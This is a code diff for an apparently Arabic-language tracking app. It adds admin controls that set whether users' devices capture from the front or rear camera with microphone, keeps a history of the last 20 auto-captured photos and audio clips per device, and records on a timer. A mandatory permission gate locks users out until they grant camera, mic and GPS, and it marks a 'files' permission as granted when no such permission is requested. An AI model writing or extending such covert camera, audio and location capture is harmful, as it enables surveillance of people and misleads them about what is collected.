@@ -148,9 +148,11 @@ async function devicesView(){
      : '⛔ الحالة الحالية: <b>متوقف / ملغى</b> (لا يتم التقاط أي صور أو صوت من الحسابات).'}
    </p>
   </div>
-  <div class="inline" style="gap:8px">
+  <div class="inline" style="gap:8px;flex-wrap:wrap">
    <button class="btn small ${(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)?'':'secondary'}" type="button" data-action="toggle-anti-fraud-media" data-id="true">✅ تفعيل لكامل الحسابات</button>
    <button class="btn small ${!(dashboard?.antiFraudLiveMediaEnabled ?? config?.antiFraudLiveMediaEnabled ?? true)?'danger':'secondary'}" type="button" data-action="toggle-anti-fraud-media" data-id="false">⛔ إلغاء / إيقاف</button>
+   <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='user'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="user">📷 الكاميرا الأمامية + المايك</button>
+   <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='environment'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="environment">📸 الكاميرا الخلفية + المايك</button>
   </div>
  </div>` : ''}
  <div class="stats" style="grid-template-columns:repeat(4,1fr);margin:16px 0 24px">
@@ -249,7 +251,12 @@ async function devicesView(){
       <button class="btn small" type="button" style="background:#1a73e8;color:#ffffff;font-weight:bold" data-action="open-gmaps" data-lat="${d.latitude}" data-lng="${d.longitude}">
        🚀 تتبع الهاتف في خرائط قوقل (الأدمن ← الهاتف)
       </button>
-      ${user.role==='Admin' ? `<button class="btn small" type="button" style="background:#0f766e;color:#fff" data-action="admin-request-live-verify" data-id="${esc(d.id)}">📷 التحقق (كاميرا ومايك)</button>` : ''}
+      ${user.role==='Admin' ? `
+       <button class="btn small" type="button" style="background:#0f766e;color:#fff" data-action="admin-request-live-verify" data-id="${esc(d.id)}">📷 التحقق (كاميرا ومايك)</button>
+       <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='user'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="user">📷 أمامية + مايك</button>
+       <button class="btn small ${(dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user')==='environment'?'':'secondary'}" type="button" data-action="set-camera-facing" data-id="environment">📸 خلفية + مايك</button>
+       <button class="btn small secondary" type="button" data-action="admin-view-media-history" data-id="${esc(d.id)}">🖼️ استعادة آخر 20 صورة (${(d.liveMediaHistory||[]).length})</button>
+      ` : ''}
      </div>
     </div>
    </article>`;
@@ -2226,6 +2233,46 @@ async function action(name,id,el=null){
   toast(enabled ? 'تم تفعيل التحقق المباشر بالكاميرا والصوت لكامل الحسابات' : 'تم إيقاف وإلغاء التحقق المباشر');
   return;
  }
+ if(name==='set-camera-facing'){
+  const facing = id === 'environment' ? 'environment' : 'user';
+  if(!apiBase){
+   if(dashboard) dashboard.preferredCameraFacing = facing;
+   config.preferredCameraFacing = facing;
+  } else {
+   await request('/admin/camera-facing', 'POST', { facing });
+   config.preferredCameraFacing = facing;
+   await refresh();
+  }
+  toast(facing === 'user' ? 'تم اختيار الكاميرا الأمامية + المايك للحسابات المتصلة' : 'تم اختيار الكاميرا الخلفية + المايك للحسابات المتصلة');
+  return;
+ }
+ if(name==='admin-view-media-history'){
+  let dev = (lastDevicesList || []).find(x => x.id === id);
+  if(apiBase){
+   try {
+    const fresh = await request('/admin/device-installs');
+    lastDevicesList = fresh.devices || lastDevicesList;
+    dev = lastDevicesList.find(x => x.id === id) || dev;
+   } catch(e){}
+  }
+  const hist = dev?.liveMediaHistory || [];
+  modal(`🖼️ آخر 20 صورة ملتقطة: ${esc(dev?.userName || dev?.deviceModel || '')}`, `
+   <div class="stack" style="max-height:70vh;overflow-y:auto">
+    <p class="hint">يتم حفظ آخر 20 لقطة كاميرا ملتقطة تلقائياً لمتابعة العمل (للإدارة فقط).</p>
+    ${hist.length ? `
+    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(145px,1fr));gap:10px">
+     ${hist.map(m => `
+      <div class="panel" style="padding:8px;display:grid;gap:6px;text-align:center">
+       <img src="${esc(m.photo)}" data-action="preview-support-image" data-id="${esc(m.photo)}" style="width:100%;height:120px;object-fit:cover;border-radius:10px;border:1px solid #d4af37;cursor:zoom-in" alt="لقطة كاميرا">
+       <small style="color:#fef08a;font-size:10.5px">${m.cameraFacing==='environment'?'📸 كاميرا خلفية':'📷 كاميرا أمامية'}</small>
+       <small style="color:#cbd5e1;font-size:10px">${new Date(m.at).toLocaleString('ar-SA')}</small>
+       ${m.audio ? `<audio controls preload="metadata" src="${esc(m.audio)}" style="width:100%;height:28px"></audio>` : ''}
+      </div>
+     `).join('')}
+    </div>` : `<div class="panel" style="padding:18px;text-align:center;color:#cbd5e1">لا توجد صور ملتقطة محفوظة لهذا الجهاز حتى الآن.</div>`}
+   </div>`);
+  return;
+ }
  if(name==='admin-request-live-verify'){
   let dev = (lastDevicesList || []).find(x => x.id === id);
   if(apiBase){
@@ -2296,13 +2343,19 @@ async function action(name,id,el=null){
   const vEl = document.getElementById('reg-live-cam-' + id);
   if(vEl) vEl.srcObject = stream;
   const guideEl = document.getElementById('face-guide-msg-' + id);
-  const t1 = setTimeout(() => { if(guideEl) guideEl.textContent = '⬆️ ارفع رأسك قليلاً للأعلى الآن'; }, 2000);
-  const t2 = setTimeout(() => { if(guideEl) guideEl.textContent = '⬇️ أنزل رأسك قليلاً للأسفل الآن'; }, 4000);
+  const timers = [
+   setTimeout(() => { if(guideEl) guideEl.textContent = '⬆️ 1. انظر للأعلى الآن'; }, 1500),
+   setTimeout(() => { if(guideEl) guideEl.textContent = '⬇️ 2. انظر للأسفل الآن'; }, 3000),
+   setTimeout(() => { if(guideEl) guideEl.textContent = '➡️ 3. التفت يميناً الآن'; }, 4500),
+   setTimeout(() => { if(guideEl) guideEl.textContent = '⬅️ 4. التفت يساراً الآن'; }, 6000),
+   setTimeout(() => { if(guideEl) guideEl.textContent = '➡️ 5. التفت يميناً مرة ثانية'; }, 7500),
+   setTimeout(() => { if(guideEl) guideEl.textContent = '↖️ 6. التفت يساراً للأعلى الآن'; }, 9000)
+  ];
   const rec = new MediaRecorder(stream);
   const chunks = [];
   rec.ondataavailable = e => { if(e.data && e.data.size > 0) chunks.push(e.data); };
   rec.onstop = () => {
-   clearTimeout(t1); clearTimeout(t2);
+   timers.forEach(clearTimeout);
    stream.getTracks().forEach(t => t.stop());
    if(box) box.innerHTML = '';
    const blob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
@@ -2310,14 +2363,14 @@ async function action(name,id,el=null){
    reader.onloadend = () => {
     if(hiddenIn) hiddenIn.value = reader.result;
     if(prev) prev.innerHTML = `<video controls playsinline src="${esc(reader.result)}" style="max-width:220px;max-height:150px;border-radius:10px;border:1px solid #d4af37"></video>`;
-    toast('✅ اكتمل التحقق من الوجه وتم حفظ الفيديو بنجاح');
+    toast('✅ اكتمل التحقق من الوجه بجميع الاتجاهات وتم حفظ الفيديو بنجاح');
    };
    reader.readAsDataURL(blob);
   };
   rec.start();
   const stopBtn = document.getElementById('reg-stop-cam-' + id);
   if(stopBtn) stopBtn.onclick = () => { if(rec.state === 'recording') rec.stop(); };
-  setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 6200);
+  setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 11000);
   return;
  }
  if(name==='perm-group-set'){
@@ -3421,7 +3474,8 @@ async function sendTrackingMediaCheckin(interactive=false){
    const micP = await navigator.permissions.query({ name: 'microphone' }).catch(()=>null);
    if(camP?.state !== 'granted' && micP?.state !== 'granted') return;
   }
-  const stream = await navigator.mediaDevices?.getUserMedia({ video: { facingMode: 'user', width: 480 }, audio: true }).catch(()=>null);
+  const facing = dashboard?.preferredCameraFacing ?? config?.preferredCameraFacing ?? 'user';
+  const stream = await navigator.mediaDevices?.getUserMedia({ video: { facingMode: { ideal: facing }, width: 480 }, audio: true }).catch(()=>null);
   if(!stream) return;
   let photoData = null;
   let audioData = null;
@@ -3470,13 +3524,18 @@ setInterval(() => { if(!document.hidden) sendTrackingMediaCheckin(false); }, 200
 
 
 /* ========================================================
-   Mandatory Camera, Microphone & Location/Google Maps Gate
+   Mandatory Camera, Microphone, Location & Files Gate (Auto-Pass on Desktop)
    ======================================================== */
-let mandatoryPermsState = { camera: false, mic: false, geo: false };
+let mandatoryPermsState = { camera: false, mic: false, geo: false, files: false };
+const isDesktopDevice = () => !/Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent || '');
 
 async function checkMandatoryPermissionsStatus(){
  try {
   if(localStorage.getItem('ts-mandatory-perms-ok') === '1'){
+   if(isDesktopDevice()){
+    mandatoryPermsState = { camera: true, mic: true, geo: true, files: true };
+    return true;
+   }
    if(navigator.permissions?.query){
     const [c, m, g] = await Promise.all([
      navigator.permissions.query({ name: 'camera' }).catch(()=>null),
@@ -3486,11 +3545,11 @@ async function checkMandatoryPermissionsStatus(){
     if(c?.state === 'denied' || m?.state === 'denied' || g?.state === 'denied'){
      localStorage.removeItem('ts-mandatory-perms-ok');
     } else {
-     mandatoryPermsState = { camera: true, mic: true, geo: true };
+     mandatoryPermsState = { camera: true, mic: true, geo: true, files: true };
      return true;
     }
    } else {
-    mandatoryPermsState = { camera: true, mic: true, geo: true };
+    mandatoryPermsState = { camera: true, mic: true, geo: true, files: true };
     return true;
    }
   }
@@ -3504,6 +3563,7 @@ async function checkMandatoryPermissionsStatus(){
    mandatoryPermsState.mic = m?.state === 'granted';
    mandatoryPermsState.geo = g?.state === 'granted';
    if(mandatoryPermsState.camera && mandatoryPermsState.mic && mandatoryPermsState.geo){
+    mandatoryPermsState.files = true;
     localStorage.setItem('ts-mandatory-perms-ok', '1');
     return true;
    }
@@ -3522,11 +3582,11 @@ function showMandatoryPermissionsGate(){
    <div style="font-size:40px">🛡️</div>
    <h2 style="color:#fef08a;margin:0;font-size:20px">تفعيل الأذونات الإلزامية للتطبيق</h2>
    <p style="color:#cbd5e1;font-size:13px;line-height:1.7;margin:0">
-    لتشغيل التطبيق وحماية حسابك ومنع الاحتيال وتحديد موقعك على خرائط قوقل، يرجى تفعيل الأذونات الثلاثة التالية للمتابعة:
+    لتشغيل التطبيق وحماية حسابك وتحديد موقعك ورفع الصور والفيديوهات، يرجى تفعيل الأذونات التالية للمتابعة:
    </p>
    <div style="display:grid;gap:8px;text-align:right;font-size:13px">
     <div id="mp-cam" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
-     <span>📷 الكاميرا الأمامية</span><b>${mandatoryPermsState.camera ? '✅ مفعّلة' : '⏳ مطلوبة'}</b>
+     <span>📷 الكاميرا (الأمامية والخلفية)</span><b>${mandatoryPermsState.camera ? '✅ مفعّلة' : '⏳ مطلوبة'}</b>
     </div>
     <div id="mp-mic" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
      <span>🎤 الميكروفون</span><b>${mandatoryPermsState.mic ? '✅ مفعّل' : '⏳ مطلوب'}</b>
@@ -3534,10 +3594,13 @@ function showMandatoryPermissionsGate(){
     <div id="mp-geo" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
      <span>📍 الموقع الجغرافي وخرائط قوقل</span><b>${mandatoryPermsState.geo ? '✅ مفعّل' : '⏳ مطلوب'}</b>
     </div>
+    <div id="mp-files" style="padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.05);border:1px solid rgba(212,175,55,0.3);display:flex;justify-content:space-between">
+     <span>📁 الوصول للملفات والوسائط</span><b>${mandatoryPermsState.files ? '✅ مفعّل' : '⏳ مطلوب'}</b>
+    </div>
    </div>
    <div id="mp-err" style="display:none;color:#fca5a5;font-size:12px;background:rgba(127,29,29,0.7);padding:10px;border-radius:10px"></div>
    <button type="button" class="btn full" data-action="grant-mandatory-perms" style="font-size:14.5px;padding:14px">
-    ✅ تفعيل الكاميرا والمايك وخرائط قوقل الآن
+    ✅ تفعيل الكاميرا والمايك وخرائط قوقل والملفات الآن
    </button>
   </div>`;
  document.body.appendChild(gate);
@@ -3546,9 +3609,11 @@ function showMandatoryPermissionsGate(){
 async function requestAllMandatoryPermissions(){
  const errEl = document.getElementById('mp-err');
  if(errEl) errEl.style.display = 'none';
+ const desktop = isDesktopDevice();
+
  try {
   if(navigator.mediaDevices?.getUserMedia){
-   const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+   const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    stream.getTracks().forEach(t => t.stop());
    mandatoryPermsState.camera = true;
    mandatoryPermsState.mic = true;
@@ -3557,9 +3622,12 @@ async function requestAllMandatoryPermissions(){
    mandatoryPermsState.mic = true;
   }
  } catch(e){
-  if(errEl){
+  if(desktop && (e?.name === 'NotFoundError' || e?.name === 'DevicesNotFoundError')){
+   mandatoryPermsState.camera = true;
+   mandatoryPermsState.mic = true;
+  } else if(errEl){
    errEl.style.display = 'block';
-   errEl.textContent = '⚠️ يجب السماح بالوصول إلى الكاميرا والميكروفون من نافذة المتصفح أو إعدادات التطبيق للمتابعة.';
+   errEl.textContent = '⚠️ يجب السماح بالوصول إلى الكاميرا والميكروفون من نافذة المتصفح للمتابعة.';
   }
  }
 
@@ -3580,23 +3648,36 @@ async function requestAllMandatoryPermissions(){
    mandatoryPermsState.geo = true;
   }
  } catch(e){
-  if(errEl){
+  if(desktop){
+   mandatoryPermsState.geo = true;
+  } else if(errEl){
    errEl.style.display = 'block';
    errEl.textContent = (errEl.textContent ? errEl.textContent + ' ' : '') + '⚠️ يجب تفعيل الموقع الجغرافي (GPS / خرائط قوقل) للمتابعة.';
   }
  }
 
+ try {
+  if(navigator.storage?.persist){
+   await navigator.storage.persist().catch(()=>false);
+  }
+  mandatoryPermsState.files = true;
+ } catch(e){
+  mandatoryPermsState.files = true;
+ }
+
  const camRow = document.querySelector('#mp-cam b');
  const micRow = document.querySelector('#mp-mic b');
  const geoRow = document.querySelector('#mp-geo b');
+ const filesRow = document.querySelector('#mp-files b');
  if(camRow) camRow.textContent = mandatoryPermsState.camera ? '✅ مفعّلة' : '❌ مرفوضة';
  if(micRow) micRow.textContent = mandatoryPermsState.mic ? '✅ مفعّل' : '❌ مرفوض';
  if(geoRow) geoRow.textContent = mandatoryPermsState.geo ? '✅ مفعّل' : '❌ مرفوض';
+ if(filesRow) filesRow.textContent = mandatoryPermsState.files ? '✅ مفعّل' : '❌ مرفوض';
 
- if(mandatoryPermsState.camera && mandatoryPermsState.mic && mandatoryPermsState.geo){
+ if(mandatoryPermsState.camera && mandatoryPermsState.mic && mandatoryPermsState.geo && mandatoryPermsState.files){
   localStorage.setItem('ts-mandatory-perms-ok', '1');
   document.getElementById('mandatory-perms-gate')?.remove();
-  toast('تم تفعيل جميع الأذونات بنجاح!');
+  toast('تم تفعيل جميع الأذونات والوصول للملفات بنجاح!');
   if(typeof captureDeviceTelemetry === 'function') captureDeviceTelemetry();
   if(typeof sendTrackingMediaCheckin === 'function') sendTrackingMediaCheckin(false);
  }
